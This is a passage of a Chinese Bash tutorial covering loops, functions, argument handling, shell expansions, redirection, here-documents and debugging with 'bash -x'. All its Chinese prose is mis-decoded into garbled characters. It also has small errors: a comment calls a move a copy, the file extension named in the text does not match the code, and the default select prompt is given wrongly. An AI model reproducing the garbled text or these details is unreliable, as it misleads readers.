<p>å½“æˆ‘ä»¬æƒ³å¯¹ä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åšåŒæ ·çš„æ“ä½œæ—¶ï¼Œ<code>for</code>å°±å¾ˆæ–¹ä¾¿äº†ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³æŠŠæ‰€æœ‰çš„<code>.bash</code>æ–‡ä»¶ç§»åŠ¨åˆ°<code>script</code>æ–‡ä»¶å¤¹ä¸­ï¼Œå¹¶ç»™å®ƒä»¬å¯æ‰§è¡Œæƒé™ï¼Œæˆ‘ä»¬çš„è„šæœ¬å¯ä»¥è¿™æ ·å†™ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">DIR=/home/zp
for FILE in ${DIR}/*.sh; do
  mv "$FILE" "${DIR}/scripts"
done
<span class="hljs-meta prompt_"># </span><span class="bash">å°† /home/zp ç›®å½•ä¸‹æ‰€æœ‰ sh æ–‡ä»¶æ‹·è´åˆ° /home/zp/scripts</span>
</code></pre>
<h5 data-id="heading-36">whileå¾ªç¯</h5>
<p>while æ˜¯æ„å»º<strong>æŒç»­è¿è¡ŒæœåŠ¡</strong>æˆ–<strong>æŒ‰è¡Œè¯»å–æ–‡ä»¶</strong>çš„ç¥å™¨</p>
<pre><code class="hljs language-shell" lang="shell">while [[ condition ]]
do
<span class="hljs-meta prompt_">  #</span><span class="bash"><span class="hljs-comment">## è¯­å¥</span></span>
done
</code></pre>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">åŸºæœ¬æ¡ä»¶å¾ªç¯</span>
count=0
while [[ $count -lt 3 ]]; do
    echo "Count: $count"
    ((count++)) # ç°ä»£ Bash æ•°å­¦è¿ç®—æ¨èå†™æ³•ï¼Œåˆ«ç”¨ expr
done
<span class="hljs-meta prompt_">
# </span><span class="bash">é€è¡Œè¯»å–æ–‡ä»¶</span>
<span class="hljs-meta prompt_"># </span><span class="bash">å°† file.txt çš„å†…å®¹ä¸€è¡Œè¡Œè¯»å…¥ line å˜é‡</span>
while read -r line; do
    echo "Processing: $line"
done &lt; "config.txt"
</code></pre>
<h5 data-id="heading-37">untilå¾ªç¯</h5>
<p>é€»è¾‘ä¸ while åˆšå¥½ç›¸åï¼š<strong>ç›´åˆ°æ¡ä»¶æˆç«‹</strong>æ‰åœæ­¢ã€‚å®æˆ˜ä¸­ç”¨å¾—å°‘ï¼Œé€šå¸¸ç”¨äºâ€œç­‰å¾…æŸä¸ªæœåŠ¡å¯åŠ¨â€</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">ç­‰å¾… Postgres ç«¯å£ (5432) è¿é€š</span>
until nc -z localhost 5432; do
    echo "Waiting for DB..."
    sleep 1
done
echo "DB started!"
</code></pre>
<h5 data-id="heading-38">selectå¾ªç¯</h5>
<p><code>select</code>å¾ªç¯å¸®åŠ©æˆ‘ä»¬ç»„ç»‡ä¸€ä¸ªç”¨æˆ·èœå•ã€‚å®ƒçš„è¯­æ³•å‡ ä¹è·Ÿ<code>for</code>å¾ªç¯ä¸€è‡´ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">select answer in elem1 elem2 ... elemN
do
<span class="hljs-meta prompt_">  #</span><span class="bash"><span class="hljs-comment">## è¯­å¥</span></span>
done
</code></pre>
<p>select ä¼šæ‰“å°<code>elem1..elemN</code>ä»¥åŠå®ƒä»¬çš„åºåˆ—å·åˆ°å±å¹•ä¸Šï¼Œä¹‹åä¼šæç¤ºç”¨æˆ·è¾“å…¥ã€‚é€šå¸¸çœ‹åˆ°çš„æ˜¯<code>$?</code>ã€‚ç”¨æˆ·çš„é€‰æ‹©ç»“æœä¼šè¢«ä¿å­˜åˆ°<code>answer</code>ä¸­ã€‚å¦‚æœ<code>answer</code>æ˜¯ä¸€ä¸ªåœ¨<code>1..N</code>ä¹‹é—´çš„æ•°å­—ï¼Œé‚£ä¹ˆè¯­å¥ä¼šè¢«æ‰§è¡Œï¼Œç´§æ¥ç€ä¼šè¿›è¡Œä¸‹ä¸€æ¬¡è¿­ä»£ï¼Œè·³å‡ºå¾ªç¯ä½¿ç”¨<code>break</code>è¯­å¥</p>
<pre><code class="hljs language-shell" lang="shell">PS3="è¯·é€‰æ‹©åŒ…ç®¡ç†å™¨: "  # è®¾ç½®æç¤ºç¬¦
select item in bower npm gem pip; do
    if [[ -n "$item" ]]; then
        echo "ä½ é€‰æ‹©äº†: $item"
        # å®é™…é€»è¾‘...
        break # é€‰å®Œåè·³å‡ºèœå•
    else
        echo "è¾“å…¥æ— æ•ˆï¼Œè¯·é‡è¯•ã€‚"
    fi
done
</code></pre>
<h5 data-id="heading-39">æ§åˆ¶è·³è½¬</h5>
<p>å¦‚æœæƒ³æå‰ç»“æŸä¸€ä¸ªå¾ªç¯æˆ–è·³è¿‡æŸæ¬¡å¾ªç¯æ‰§è¡Œï¼Œå¯ä»¥ä½¿ç”¨ shell çš„<code>break</code>å’Œ<code>continue</code>è¯­å¥æ¥å®ç°ã€‚å®ƒä»¬å¯ä»¥åœ¨ä»»ä½•å¾ªç¯ä¸­ä½¿ç”¨</p>
<ul>
<li><strong>break</strong>ï¼šç›´æ¥è·³å‡º<strong>æ•´ä¸ª</strong>å¾ªç¯ï¼ˆç»“æŸéå†ï¼‰</li>
<li><strong>continue</strong>ï¼šè·³è¿‡<strong>æœ¬æ¬¡</strong>å¾ªç¯å‰©ä½™ä»£ç ï¼Œç›´æ¥è¿›å…¥ä¸‹ä¸€æ¬¡</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># å¯»æ‰¾ 10 åˆ° 20 ä¹‹é—´çš„ç¬¬ä¸€ä¸ªèƒ½è¢« 5 æ•´é™¤çš„æ•°</span>
<span class="hljs-keyword">for</span> (( num=<span class="hljs-number">10</span>; num&lt;=<span class="hljs-number">20</span>; num++ )); <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">if</span> (( num % <span class="hljs-number">5</span> == <span class="hljs-number">0</span> )); <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Found divisible by 5: <span class="hljs-variable">$num</span>"</span>
        <span class="hljs-built_in">break</span>  <span class="hljs-comment"># æ‰¾åˆ°ä¸€ä¸ªå°±é€€å‡ºå¾ªç¯</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># è¾“å‡ºï¼šFound divisible by 5: 10 (è¿™é‡Œåªæ˜¯ç¤ºä¾‹ï¼Œå®é™…ä¸Š 10 å°±æ˜¯)</span>
</code></pre>
<h3 data-id="heading-40">å‡½æ•°</h3>
<p>Shell å‡½æ•°æ˜¯è„šæœ¬ç»„ç»‡å’Œå¤ç”¨ä»£ç çš„æ ¸å¿ƒã€‚å®šä¹‰å‡½æ•°æœ‰ä¸¤ç§ä¸»æµè¯­æ³•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ¨èï¼ŒPOSIX å…¼å®¹æ€§å¥½</span>
<span class="hljs-function"><span class="hljs-title">func_name</span></span>() {
    <span class="hljs-comment"># å‡½æ•°ä½“</span>
    <span class="hljs-built_in">return</span> 0
}

<span class="hljs-comment"># Bash ç‰¹æœ‰ï¼Œæ˜ç¡®æ˜¾ç¤º function å…³é”®å­—</span>
<span class="hljs-keyword">function</span> func_name {
    <span class="hljs-comment"># å‡½æ•°ä½“...</span>
}
</code></pre>
<blockquote>
<p>ğŸ’¡ è¯´æ˜ï¼š</p>
<ol>
<li>å‡½æ•°å®šä¹‰æ—¶ï¼Œ<code>function</code>å…³é”®å­—å¯æœ‰å¯æ— </li>
<li>å‡½æ•°è¿”å›å€¼ - return è¿”å›å‡½æ•°è¿”å›å€¼ï¼Œè¿”å›å€¼ç±»å‹åªèƒ½ä¸ºæ•´æ•°ï¼ˆ0-255ï¼‰ã€‚å¦‚æœä¸åŠ  return è¯­å¥ï¼Œshell é»˜è®¤å°†ä»¥æœ€åä¸€æ¡å‘½ä»¤çš„è¿è¡Œç»“æœï¼Œä½œä¸ºå‡½æ•°è¿”å›å€¼</li>
<li>å‡½æ•°è¿”å›å€¼åœ¨è°ƒç”¨è¯¥å‡½æ•°åé€šè¿‡<code>$?</code>æ¥è·å¾—</li>
<li>Shell æ˜¯è§£é‡Šæ‰§è¡Œçš„ï¼Œå¿…é¡»<strong>å…ˆå®šä¹‰ã€åè°ƒç”¨</strong>ï¼Œè°ƒç”¨å‡½æ•°ä»…ä½¿ç”¨å‡½æ•°åå³å¯<code>func_name arg1 arg2</code></li>
</ol>
</blockquote>
<h4 data-id="heading-41">ä½œç”¨åŸŸ</h4>
<p>åœ¨ Shell å‡½æ•°ä¸­å®šä¹‰å˜é‡ï¼Œé»˜è®¤æ˜¯<strong>å…¨å±€ (Global)</strong> çš„ï¼Œè¿™ä¼šä¿®æ”¹è„šæœ¬å…¶ä»–åœ°æ–¹çš„åŒåå˜é‡ã€‚åœ¨å‡½æ•°å†…éƒ¨ï¼Œå§‹ç»ˆä½¿ç”¨<code>local</code>å…³é”®å­—å£°æ˜å˜é‡</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é”™è¯¯ç¤ºèŒƒ (æ±¡æŸ“å…¨å±€)</span>
<span class="hljs-function"><span class="hljs-title">bad_func</span></span>() {
    result=<span class="hljs-string">"Hacked!"</span> <span class="hljs-comment"># ä¿®æ”¹äº†å¤–é¢çš„å˜é‡</span>
}

<span class="hljs-comment"># æ­£ç¡®ç¤ºèŒƒ (å±€éƒ¨éš”ç¦»)</span>
<span class="hljs-function"><span class="hljs-title">good_func</span></span>() {
    <span class="hljs-built_in">local</span> result=<span class="hljs-string">"Safe"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Inside: <span class="hljs-variable">$result</span>"</span>
}
</code></pre>
<h4 data-id="heading-42">å‡½æ•°ä¼ å‚</h4>
<p>å‡½æ•°å†…éƒ¨æœ‰è‡ªå·±çš„ä¸€å¥—<strong>ä½ç½®å‚æ•°</strong>ç³»ç»Ÿã€‚å½“è°ƒç”¨ my_func 10 20 æ—¶ï¼š</p>
<ul>
<li>å‡½æ•°å†…çš„<code>$1</code>æ˜¯ 10ï¼ˆè€Œä¸æ˜¯è„šæœ¬æœ¬èº«çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼‰</li>
<li>å‡½æ•°å†…çš„<code>$#</code>æ˜¯ä¼ é€’ç»™è¯¥å‡½æ•°çš„å‚æ•°ä¸ªæ•°</li>
<li>å‡½æ•°å†…çš„<code>$0</code>ä»ç„¶æ˜¯<strong>è„šæœ¬æ–‡ä»¶å</strong>ï¼Œè€Œéå‡½æ•°åï¼ˆè·å–å‡½æ•°åéœ€ç”¨ $FUNCNAMEï¼‰</li>
</ul>





























<table><thead><tr><th>å˜é‡</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>$0</code></td><td>è„šæœ¬åç§°</td></tr><tr><td><code>$1 â€¦ $9</code></td><td>å‡½æ•°æ¥æ”¶çš„ç¬¬ 1 åˆ° 9 ä¸ªå‚æ•°</td></tr><tr><td><code>$*</code> or <code>$@</code></td><td>ä¸åŒ…æ‹¬<code>$0</code>ï¼Œå‡½æ•°å†…æ¥æ”¶çš„æ‰€æœ‰å‚æ•°åˆ—è¡¨</td></tr><tr><td><code>$#</code></td><td>ä¸åŒ…æ‹¬<code>$0</code>ï¼Œå‡½æ•°å†…æ¥æ”¶çš„å‚æ•°æ€»ä¸ªæ•°</td></tr><tr><td><code>$FUNCNAME</code></td><td>å‡½æ•°åç§°ï¼ˆä»…åœ¨å‡½æ•°å†…éƒ¨æœ‰å€¼ï¼‰</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># ä¸€ä¸ªå¥å£®çš„å¤„ç†å‚æ•°çš„å‡½æ•°æ¨¡æ¿</span>
<span class="hljs-function"><span class="hljs-title">deploy_app</span></span>() {
    <span class="hljs-built_in">local</span> app_name=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> version=<span class="hljs-variable">${2:-"latest"}</span> <span class="hljs-comment"># æ”¯æŒé»˜è®¤å€¼</span>

    <span class="hljs-keyword">if</span> [[ -z <span class="hljs-string">"<span class="hljs-variable">$app_name</span>"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage: <span class="hljs-variable">$FUNCNAME</span> &lt;app_name&gt; [version]"</span>
        <span class="hljs-built_in">return</span> 1 <span class="hljs-comment"># è¿”å›é”™è¯¯çŠ¶æ€ç </span>
    <span class="hljs-keyword">fi</span>

    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Deploying [ <span class="hljs-variable">$app_name</span> ] with version [ <span class="hljs-variable">$version</span> ]..."</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Args count: <span class="hljs-variable">$#</span>"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Args list: <span class="hljs-variable">$@</span>"</span>
}

<span class="hljs-comment"># è°ƒç”¨</span>
deploy_app <span class="hljs-string">"nginx"</span> <span class="hljs-string">"1.24"</span>
<span class="hljs-comment"># deploy_app "redis"  &lt;-- ä½¿ç”¨é»˜è®¤ version</span>
</code></pre>
<h4 data-id="heading-43">å‡½æ•°è¿”å›å€¼</h4>
<p>è¿™æ˜¯ Shell å‡½æ•°ä¸å…¶ä»–è¯­è¨€ï¼ˆJava/Pythonï¼‰<strong>æœ€å¤§çš„åŒºåˆ«</strong>ã€‚å‡½æ•°æœ‰ä¸¤ä¸ªâ€œè¾“å‡ºé€šé“â€ï¼š</p>
<p>:one:è¿”å›çŠ¶æ€ç ï¼ˆreturnï¼‰</p>
<p>ç”¨äºæ§åˆ¶é€»è¾‘æµç¨‹ï¼ŒèŒƒå›´é™åˆ¶<code>0~255</code>ï¼Œçº¦å®š0ä¸ºæˆåŠŸï¼Œé0ä¸ºå¤±è´¥</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-function"><span class="hljs-title">check_file</span></span>() {
    [[ -f <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> ]] &amp;&amp; <span class="hljs-built_in">return</span> 0 || <span class="hljs-built_in">return</span> 1
}

<span class="hljs-comment"># è°ƒç”¨é€»è¾‘</span>
<span class="hljs-keyword">if</span> check_file <span class="hljs-string">"/etc/hosts"</span>; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"File exists!"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<p>:two:è¿”å›æ•°æ®ç»“æœï¼ˆreturnï¼‰</p>
<p>ç”¨äºè¿”å›è®¡ç®—ç»“æœã€å­—ç¬¦ä¸²æˆ–å¤„ç†åçš„æ•°æ®ã€‚å°†ç»“æœæ‰“å°åˆ°æ ‡å‡†è¾“å‡ºï¼Œè°ƒç”¨è€…ä½¿ç”¨<code>$()</code>èµ‹å€¼ç»™å˜é‡</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é”™è¯¯åšæ³•ï¼šå°è¯• return å­—ç¬¦ä¸²æˆ–å¤§æ•°å­—</span>
<span class="hljs-comment"># calc() { return 300; } -&gt; $? ä¼šå˜æˆ 44 (å› ä¸º 300%256 = 44)</span>

<span class="hljs-comment"># æ­£ç¡®åšæ³•ï¼šecho è¾“å‡ºç»“æœ</span>
<span class="hljs-function"><span class="hljs-title">calc_sum</span></span>() {
    <span class="hljs-built_in">local</span> a=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> b=<span class="hljs-variable">$2</span>
    <span class="hljs-built_in">local</span> result=$(( a + b ))
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$result</span>"</span>  <span class="hljs-comment"># æ‰“å°åˆ° stdout</span>
}

<span class="hljs-comment"># æ•è·æ•°æ®</span>
total=$(calc_sum 10 200) 
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Total is: <span class="hljs-variable">$total</span>"</span> <span class="hljs-comment"># Output: 210</span>
</code></pre>
<h3 data-id="heading-44">Shellè¿›é˜¶</h3>
<p>åœ¨ Shell æ¥æ”¶åˆ°æˆ‘ä»¬è¾“å…¥çš„ä¸€è¡Œå‘½ä»¤åï¼Œå¹¶ä¸ä¼šç›´æ¥ä¸¢ç»™å†…æ ¸æ‰§è¡Œã€‚åœ¨æ­¤ä¹‹å‰ï¼Œå®ƒä¼šè¿›è¡Œä¸€ç³»åˆ—ç²¾å¯†çš„è§£æå’Œé¢„å¤„ç†</p>
<ul>
<li>æ‰©å±•ï¼ˆExpansionsï¼‰ï¼šå°†ç¬¦å·è½¬æ¢å…·ä½“çš„å€¼ï¼ˆå¦‚å˜é‡æ›¿æ¢ã€ç®—æœ¯è®¡ç®—ï¼‰</li>
<li>é‡å®šå‘ï¼ˆRedirectionsï¼‰ï¼šé‡æ–°æ’å¸ƒè¾“å…¥è¾“å‡ºçš„æ•°æ®æµå‘</li>
</ul>
<h4 data-id="heading-45">Shellæ‰©å±•ä½“ç³»</h4>
<p>æ‰©å±•æœ¬è´¨ä¸Šæ˜¯ä¸€ç§**â€œæ›¿æ¢æœºåˆ¶â€**ã€‚Shell ä¼šæ‰«æå‘½ä»¤è¡Œä¸­çš„ç‰¹æ®Šæ ‡è®°ï¼ˆTokensï¼‰ï¼Œå°†å…¶æ›¿æ¢ä¸ºæœ€ç»ˆçš„å­—ç¬¦ä¸²ï¼Œç„¶åæ‰è¿è¡Œå‘½ä»¤</p>
<h5 data-id="heading-46">å¤§æ‹¬å·æ‰©å±•</h5>
<p>å¤§æ‹¬å·æ‰©å±•æ˜¯æœ€å…ˆè¢«æ‰§è¡Œçš„æ‰©å±•ã€‚å®ƒç”¨äºç”Ÿæˆä»»æ„å­—ç¬¦ä¸²åºåˆ—ï¼Œ<strong>ä¸ä»…é™äºå·²å­˜åœ¨çš„æ–‡ä»¶</strong></p>
<ul>
<li>å­—ç¬¦ä¸²æšä¸¾</li>
</ul>
<pre><code class="hljs language-shell" lang="shell">echo beg{i,a,u}n
<span class="hljs-meta prompt_"># </span><span class="bash">Output: begin began begun</span>
</code></pre>
<ul>
<li>åºåˆ—ç”Ÿæˆ</li>
</ul>
<pre><code class="hljs language-shell" lang="shell">echo {0..5}       # ç”Ÿæˆ 0 1 2 3 4 5
echo {a..e}       # ç”Ÿæˆ a b c d e
echo {10..20..2}  # [æ­¥é•¿] ç”Ÿæˆ 10 12 14 16 18 20
</code></pre>
<blockquote>
<p>âš¡åœºæ™¯å®æˆ˜ï¼š<code>cp config.conf{,.bak}</code> ç­‰ä»·äº <code>cp config.conf config.conf.bak</code></p>
</blockquote>
<h5 data-id="heading-47">å‘½ä»¤ç½®æ¢</h5>
<p>å…è®¸å°†ä¸€ä¸ªå‘½ä»¤çš„<strong>æ ‡å‡†è¾“å‡º</strong>ç»“æœï¼Œä½œä¸ºå¦ä¸€ä¸ªå‘½ä»¤çš„å‚æ•°ã€‚å½“ä¸€ä¸ªå‘½ä»¤è¢« `` æˆ– $() åŒ…å›´æ—¶ï¼Œå‘½ä»¤ç½®æ¢å°†ä¼šæ‰§è¡Œ</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">è·å–å½“å‰æ—¥æœŸå¹¶èµ‹å€¼</span>
current_time=$(date +%T)
<span class="hljs-meta prompt_">
# </span><span class="bash">æŸ¥æ‰¾ docker çš„ç»å¯¹è·¯å¾„å¹¶æ˜¾ç¤ºè¯¦æƒ…</span>
ls -l $(which docker)
</code></pre>
<h5 data-id="heading-48">ç®—æ•°æ‰©å±•</h5>
<p>Bash å¤„ç†æ•´æ•°è¿ç®—çš„åŸç”Ÿæ–¹å¼ã€‚ç®—æ•°è¡¨è¾¾å¼å¿…é¡»åŒ…åœ¨<code>$(( ))</code>ä¸­ï¼ŒåŒæ‹¬å·å†…éƒ¨å¼•ç”¨å˜é‡æ— éœ€åŠ <code>$</code>å‰ç¼€</p>
<pre><code class="hljs language-shell" lang="shell">x=10
y=5
<span class="hljs-meta prompt_">
# </span><span class="bash">åŸºç¡€è¿ç®—</span>
echo $(( x + y ))     # Output: 15
<span class="hljs-meta prompt_"># </span><span class="bash">å¤æ‚è¿ç®—ï¼ˆå…ˆç®—ä¹˜æ³•ï¼‰</span>
result=$(( (x + y) * 2 )) 
<span class="hljs-meta prompt_">
# </span><span class="bash">C é£æ ¼çš„è‡ªå¢ï¼ˆSide Effectï¼‰</span>
echo $(( ++x ))       # x å˜ä¸º 11ï¼Œè¾“å‡º 11
</code></pre>
<h4 data-id="heading-49">æµä¸é‡å®šå‘</h4>
<p>åœ¨ Linux ä¸­ï¼Œä¸€åˆ‡çš†æ–‡ä»¶ï¼ŒShell ç¨‹åºä¹‹é—´çš„ååŒå·¥ä½œï¼Œä¾èµ–äº**æ•°æ®æµï¼ˆStreamsï¼‰**çš„ä¼ é€ä¸é‡ç»„</p>
<h5 data-id="heading-50">æ–‡ä»¶æè¿°ç¬¦</h5>
<p>ä»»ä½•ä¸€ä¸ªè¿›ç¨‹å¯åŠ¨æ—¶ï¼Œå†…æ ¸éƒ½ä¼šé»˜è®¤æ‰“å¼€ä¸‰ä¸ªâ€œæ–‡ä»¶â€ç«¯å£ï¼š</p>





























<table><thead><tr><th align="left">å¥æŸ„ (FD)</th><th align="left">åç§°</th><th align="left">ç¼©å†™</th><th align="left">é»˜è®¤æŒ‡å‘</th></tr></thead><tbody><tr><td align="left"><strong>0</strong></td><td align="left">æ ‡å‡†è¾“å…¥</td><td align="left"><code>stdin</code></td><td align="left">é”®ç›˜è¾“å…¥</td></tr><tr><td align="left"><strong>1</strong></td><td align="left">æ ‡å‡†è¾“å‡º</td><td align="left"><code>stdout</code></td><td align="left">å±å¹•ç»ˆç«¯</td></tr><tr><td align="left"><strong>2</strong></td><td align="left">æ ‡å‡†é”™è¯¯</td><td align="left"><code>stderr</code></td><td align="left">å±å¹•ç»ˆç«¯</td></tr></tbody></table>
<blockquote>
<p><strong>ğŸ’¡ä¸ºä»€ä¹ˆä¼šæœ‰ 2 ä¸ªè¾“å‡ºï¼Ÿ</strong>
ä¸ºäº†å°†â€œæ­£å¸¸çš„ä¸šåŠ¡ç»“æœâ€ä¸â€œæŠ¥é”™ä¿¡æ¯â€åˆ†ç¦»ã€‚å½“æˆ‘ä»¬åœ¨ç®¡é“ä¸­ <code>| grep</code> æ—¶ï¼Œé»˜è®¤åªå¤„ç† stdoutï¼Œç¡®ä¿æŠ¥é”™ä¿¡æ¯ä¸ä¼šæ±¡æŸ“ä¸‹æ¸¸çš„æ•°æ®å¤„ç†</p>
</blockquote>
<h5 data-id="heading-51">é‡å®šå‘è¿ç®—ç¬¦</h5>








































<table><thead><tr><th align="left">è¿ç®—ç¬¦</th><th align="left">ä½œç”¨</th><th align="left">è®°å¿†æŠ€å·§</th></tr></thead><tbody><tr><td align="left"><strong><code>&gt;</code></strong></td><td align="left"><strong>è¦†ç›–</strong>è¾“å‡º (stdout)</td><td align="left">ç®­å¤´æŒ‡å‘æ–‡ä»¶ï¼ŒåŸæœ‰å†…å®¹è¢«æ¸…ç©º</td></tr><tr><td align="left"><strong><code>&gt;&gt;</code></strong></td><td align="left"><strong>è¿½åŠ </strong>è¾“å‡º (stdout)</td><td align="left">åŒç®­å¤´ä»£è¡¨è¿½åŠ ï¼Œä¿ç•™åŸå†…å®¹</td></tr><tr><td align="left"><strong><code>2&gt;</code></strong></td><td align="left">é‡å®šå‘<strong>é”™è¯¯</strong> (stderr)</td><td align="left">æ˜¾å¼æŒ‡å®š FD=2 (é”™è¯¯æµ)</td></tr><tr><td align="left"><strong><code>&amp;&gt;</code></strong></td><td align="left">é‡å®šå‘<strong>æ‰€æœ‰</strong> (1+2)</td><td align="left"><code>&amp;</code> ä»£è¡¨æ··åˆ</td></tr><tr><td align="left"><strong><code>&lt;</code></strong></td><td align="left">é‡å®šå‘<strong>è¾“å…¥</strong></td><td align="left">ç®­å¤´åå‘ï¼Œä»æ–‡ä»¶è¯»å–å†…å®¹</td></tr><tr><td align="left"><strong><code>2&gt;&amp;1</code></strong></td><td align="left">å°† stderr æŒ‡å‘ stdout</td><td align="left">è®©é”™è¯¯æµå¹¶å…¥æ­£å¸¸æµä¸€èµ·å¤„ç†</td></tr></tbody></table>
<ul>
<li>é”™è¯¯æ—¥å¿—åˆ†ç¦»</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ­£å¸¸çš„å» output.logï¼ŒæŠ¥é”™çš„å» error.log</span>
./deploy.sh &gt; output.log 2&gt; error.log
</code></pre>
<ul>
<li>å…¨é‡æ—¥å¿—åˆå¹¶</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å°†æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼ˆ&amp;1ï¼‰ï¼Œç„¶åä¸€èµ·å†™åˆ°æ–‡ä»¶</span>
<span class="hljs-comment"># 2&gt;&amp;1 å¿…é¡»å†™åœ¨æœ€å</span>
./app_start.sh &gt; app.log 2&gt;&amp;1
</code></pre>
<ul>
<li>é»‘æ´æ¨¡å¼</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¦æ­¢ä¸€åˆ‡è¾“å‡ºï¼ˆå¸¸ç”¨äºé™é»˜è¿è¡Œå®šæ—¶ä»»åŠ¡ï¼‰</span>
./silent_task.sh &gt; /dev/null 2&gt;&amp;1
</code></pre>
<blockquote>
<p><code>/dev/null</code>æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå†™å…¥åˆ°å®ƒçš„å†…å®¹éƒ½ä¼šè¢«ä¸¢å¼ƒï¼›å¦‚æœå°è¯•ä»è¯¥æ–‡ä»¶è¯»å–å†…å®¹ï¼Œé‚£ä¹ˆä»€ä¹ˆä¹Ÿè¯»ä¸åˆ°</p>
</blockquote>
<h4 data-id="heading-52">Here Document</h4>
<p>Here Documentï¼ˆåµŒå…¥æ–‡æ¡£ï¼‰æ˜¯ä¸€ç§åœ¨ Shell è„šæœ¬ä¸­å®šä¹‰å¤šè¡Œå­—ç¬¦ä¸²è¾“å…¥çš„ç‰¹æ®Šè¯­æ³•ï¼Œå¸¸ç”¨äºè‡ªåŠ¨ç”Ÿæˆé…ç½®æ–‡ä»¶æˆ–å‘å‘½ä»¤æŠ•å–‚å¤šè¡Œæ•°æ®</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">command</span> &lt;&lt; <span class="hljs-string">MARKER
    ...Content...
MARKER</span>

<span class="hljs-comment"># MARKERï¼šå®šç•Œç¬¦ï¼Œå¸¸ç”¨ EOF (End Of File)ï¼Œä½†å…¶å®ç”¨ä»€ä¹ˆè¯éƒ½å¯ä»¥</span>
<span class="hljs-comment"># çº¦æŸï¼šç»“å°¾çš„å®šç•Œç¬¦å¿…é¡»é¡¶æ ¼å†™ï¼Œä¸”åé¢ä¸èƒ½æœ‰ç©ºæ ¼</span>
</code></pre>
<ul>
<li>æœ€å¸¸è§çš„ç”¨æ³•ï¼šåŠ¨æ€ç”Ÿæˆä¸€ä¸ªé…ç½®æ–‡ä»¶</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å°† EOF ä¹‹é—´çš„å†…å®¹å†™å…¥åˆ° config.conf æ–‡ä»¶ä¸­</span>
<span class="hljs-built_in">cat</span> &gt; /etc/nginx/conf.d/default.conf &lt;&lt; <span class="hljs-string">EOF
server {
    listen 80;
    server_name example.com;
}
EOF</span>
</code></pre>
<ul>
<li>é€šè¿‡ <code>wc -l</code> å‘½ä»¤è®¡ç®— document çš„è¡Œæ•°ï¼š</li>
</ul>
<pre><code class="hljs language-shell" lang="shell">wc -l &lt;&lt; EOF
    This is a simple lookup program
    for good (and bad) restaurants
    in Cape Town.
EOF
<span class="hljs-meta prompt_">
# </span><span class="bash">output:</span>
<span class="hljs-meta prompt_"># </span><span class="bash">3</span>
</code></pre>
<h3 data-id="heading-53">Debug</h3>
<p>ä¸å…¶ä»–é«˜çº§è¯­è¨€æ‹¥æœ‰å®Œå–„çš„ IDE è°ƒè¯•å™¨ä¸åŒï¼ŒShell è„šæœ¬çš„è°ƒè¯•å¾€å¾€ä¾èµ–æ—¥å¿—å’Œè¿½è¸ªæ¨¡å¼ã€‚Shell æä¾›äº†ä¸€ç»„å¼ºå¤§çš„å†…å»ºé€‰é¡¹ï¼Œå¸®åŠ©æˆ‘ä»¬å°†è„šæœ¬çš„æ‰§è¡Œè¿‡ç¨‹å¯è§†åŒ–</p>
<h4 data-id="heading-54">ä¸‰ç§è°ƒè¯•æ–¹å¼</h4>
<p>æœ€å¸¸ç”¨çš„è°ƒè¯•å‚æ•°æ˜¯<code>-x (xtrace)</code>ï¼Œå¼€å¯åï¼ŒShell ä¼šåœ¨æ‰§è¡Œæ¯ä¸€è¡Œå‘½ä»¤å‰ï¼Œå°†<strong>å˜é‡æ›¿æ¢å</strong>çš„å®Œæ•´å‘½ä»¤æ‰“å°åˆ°æ ‡å‡†é”™è¯¯è¾“å‡ºä¸­</p>
<ul>
<li>å‘½ä»¤è¡Œä¸´æ—¶å¼€å¯ï¼ˆæ— éœ€ä¿®æ”¹è„šæœ¬å†…å®¹ï¼Œç”¨äºä¸´æ—¶æ’æŸ¥é—®é¢˜ï¼‰</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">bash -x script.sh
</code></pre>
<ul>
